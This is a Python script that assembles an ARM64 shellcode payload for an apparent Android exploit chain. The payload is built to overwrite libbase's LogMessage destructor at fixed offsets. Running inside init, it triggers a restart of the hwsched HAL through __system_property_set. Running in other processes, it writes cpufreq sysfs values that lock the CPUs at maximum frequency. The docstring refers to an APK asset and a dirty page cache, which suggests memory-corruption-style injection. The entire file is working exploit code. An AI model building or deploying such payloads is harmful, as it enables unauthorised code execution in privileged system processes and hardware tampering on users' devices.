#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Payload C: CPU-frequency lock, armed via a hwsched HAL restart.

init branch (uid 0, pid 1):
  * create one-shot marker /dev/.dic (O_WRONLY|O_CREAT|O_EXCL)
  * call libbase's PLT stub for __system_property_set("ctl.restart",
    "hwsched-1-0"); init then restarts the hwsched HAL.  When hwsched
    re-registers, libhidlbase calls libbase LogMessage, whose destructor is our
    payload entry.

non-init branch (any process, e.g. hwsched):
  * open /sys/devices/system/cpu/cpufreq and write the hardware maxima:
      policy0/scaling_max_freq = 1954000
      policy0/scaling_min_freq = 1954000
      policy1/scaling_min_freq = 2360000
      policy2/scaling_min_freq = 2861000
  * pop saved regs + ret (skips the destructor body; same trick as A'/B).

Everything returns directly (no dependence on the prologue slots patched by
the native code), so deploying on a dirty page cache is safe.

Device-specific constants, verified against the pulled /system/lib64/libbase.so
(SHA256 16db270d68dc2f163980668a1bdf388e5dfb656cd9258c7a1afbeec01518f294):
  _ZN7android4base10LogMessageD1Ev  = 0x14e20 (size 828)
  __system_property_set@plt        = 0x38810
"""
import struct
import sys

from keystone import Ks, KS_ARCH_ARM64, KS_MODE_LITTLE_ENDIAN

FUNC_OFF = 0x14E20
PLT_PROP_SET = 0x38810

FORBIDDEN = (0x204, 0x220)
NOP4 = bytes([0x1F, 0x20, 0x03, 0xD5])
END = 0x240                       # 576 bytes, what the APK asset must be

CODE = """
    stp x0, x30, [sp, #-0x10]!
    stp x19, x20, [sp, #-0x10]!
    stp x21, x22, [sp, #-0x10]!
    mov x8, #0xae
    svc #0
    cbnz w0, noninit
    mov x8, #0xac
    svc #0
    cmp w0, #1
    b.ne noninit

    /* ---- init: one-shot marker so the restart happens exactly once ---- */
    mov x0, #-100
    adr x1, marker
    mov x2, #0xc1
    mov x3, #0
    mov x8, #56
    svc #0
    tbnz x0, #63, restore
    mov x8, #57
    svc #0

    /* ---- init: ctl.restart=hwsched-1-0 through libbase's PLT ---- */
    adr x0, restart_name
    adr x1, restart_val
    bl #4
    b restore

    /* ---- non-init: lock cpufreq at hardware maxima ---- */
noninit:
    mov x0, #-100
    adr x1, prefix
    mov x2, #0x10000
    mov x3, #0
    mov x8, #56
    svc #0
    tbnz x0, #63, restore
    mov x20, x0
    adr x19, ctab
    adr x21, strbase
    mov x22, #4
cf_loop:
    ldr w1, [x19], #4
    and w2, w1, #0xffff
    ubfx w3, w1, #16, #16
    add x2, x21, x2
    add x4, x21, x3
    mov x0, x20
    mov x1, x2
    mov x2, #1
    mov x3, #0
    mov x8, #56
    svc #0
    tbnz x0, #63, cf_next
    mov x5, x0
    mov x0, x5
    mov x1, x4
    mov x2, #8
    mov x8, #64
    svc #0
    mov x0, x5
    mov x8, #57
    svc #0
cf_next:
    subs x22, x22, #1
    b.ne cf_loop

restore:
    ldp x21, x22, [sp], #0x10
    ldp x19, x20, [sp], #0x10
    ldp x0, x30, [sp], #0x10
    ret
"""

MARKER_S = b"/dev/.dic\x00"
RESTART_NAME = b"ctl.restart\x00"
RESTART_VAL = b"hwsched-1-0\x00"
PREFIX_S = b"/sys/devices/system/cpu/cpufreq\x00"
PATHS = [b"policy0/scaling_max_freq\x00",
         b"policy0/scaling_min_freq\x00",
         b"policy1/scaling_min_freq\x00",
         b"policy2/scaling_min_freq\x00"]
VALS = [b"1954000\n", b"1954000\n", b"2360000\n", b"2861000\n"]
SENTINEL = struct.pack("<I", 0x94000001)   # bl #4 placeholder


def align(x, a=8):
    return (x + a - 1) // a * a


def byte_directive(data):
    return ".byte " + ", ".join("0x%02x" % b for b in data)


def plan(items, start, forbidden):
    lo, hi = forbidden
    pos = start
    placed = []
    for blob in items:
        pos = align(pos)
        if pos < hi and pos + len(blob) > lo:
            pos = align(hi)
        placed.append(pos)
        pos += len(blob)
    return placed, pos


def build(end=END):
    ks = Ks(KS_ARCH_ARM64, KS_MODE_LITTLE_ENDIAN)
    probe = (CODE + "\nmarker:\nrestart_name:\nrestart_val:\nprefix:\n"
             "strbase:\nctab:\n")
    code_len = len(ks.asm(probe, addr=0)[0])

    data_start = align(code_len)
    uniq = []
    for v in VALS:
        if v not in uniq:
            uniq.append(v)
    vals_blob = b"".join(uniq)
    items = [MARKER_S, RESTART_NAME, RESTART_VAL, PREFIX_S,
             b"".join(PATHS), vals_blob, bytes(4 * len(PATHS))]
    pos, d_end = plan(items, data_start, FORBIDDEN)
    names = ["marker", "restart_name", "restart_val", "prefix", "paths", "vals", "ctab"]
    loc = dict(zip(names, pos))
    if d_end > FORBIDDEN[0]:
        raise SystemExit("data does not fit below the native slot area: %r"
                         % {k: hex(v) for k, v in loc.items()})

    strbase = loc["prefix"]
    ctab = bytearray()
    p = loc["paths"]
    for i, path in enumerate(PATHS):
        v_off = loc["vals"] + vals_blob.index(VALS[i])
        ctab += (p - strbase).to_bytes(2, "little") + (v_off - strbase).to_bytes(2, "little")
        p += len(path)

    parts = [CODE]
    parts.append(".org 0x%x" % loc["marker"])
    parts.append("marker:")
    parts.append(byte_directive(MARKER_S))
    parts.append("restart_name:")
    parts.append(byte_directive(RESTART_NAME))
    parts.append("restart_val:")
    parts.append(byte_directive(RESTART_VAL))
    parts.append(".org 0x%x" % loc["prefix"])
    parts.append("prefix:")
    parts.append(byte_directive(PREFIX_S))
    parts.append("strbase:")
    parts.append(".org 0x%x" % loc["paths"])
    parts.append("paths:")
    for path in PATHS:
        parts.append(byte_directive(path))
    parts.append(".org 0x%x" % loc["vals"])
    parts.append("vals:")
    parts.append(byte_directive(vals_blob))
    parts.append(".org 0x%x" % loc["ctab"])
    parts.append("ctab:")
    parts.append(byte_directive(bytes(ctab)))
    parts.append(".org 0x%x" % FORBIDDEN[0])
    parts.append(byte_directive(NOP4 * 7))
    parts.append(".org 0x%x" % end)
    blob = bytearray(ks.asm("\n".join(parts), addr=0)[0])
    if len(blob) != end:
        raise SystemExit("size %#x" % len(blob))

    # the instruction offset of the bl does not depend on how it is encoded all
    # instructions have a fixed width; assemble the code prefix to learn it.
    split = CODE.index("bl #4")
    before = CODE[:split] + "\nmarker:\nrestart_name:\nrestart_val:\nprefix:\n" \
             "strbase:\nctab:\nnoninit:\nrestore:\n"
    idx = len(ks.asm(before, addr=0)[0])
    disp = PLT_PROP_SET - FUNC_OFF - idx
    if disp % 4 or not (-(1 << 27) <= disp < (1 << 27)):
        raise SystemExit("bad plt displacement %#x" % disp)
    insn = 0x94000000 | ((disp >> 2) & 0x3FFFFFF)
    blob[idx:idx + 4] = struct.pack("<I", insn)
    return bytes(blob), dict(code_len=code_len, data_start=data_start,
                             data_end=d_end, **{k: v for k, v in loc.items()}), idx, disp


if __name__ == "__main__":
    blob, info, idx, disp = build()
    print("layout:", {k: hex(v) for k, v in info.items()})
    print("bl at %#x -> disp %#x (%d)" % (idx, disp, disp))
    print("size:", len(blob), "entry:", blob[0:16].hex())
    out = sys.argv[1] if len(sys.argv) > 1 else "payload_576_cpu.bin"
    open(out, "wb").write(blob)
    print("written", out)
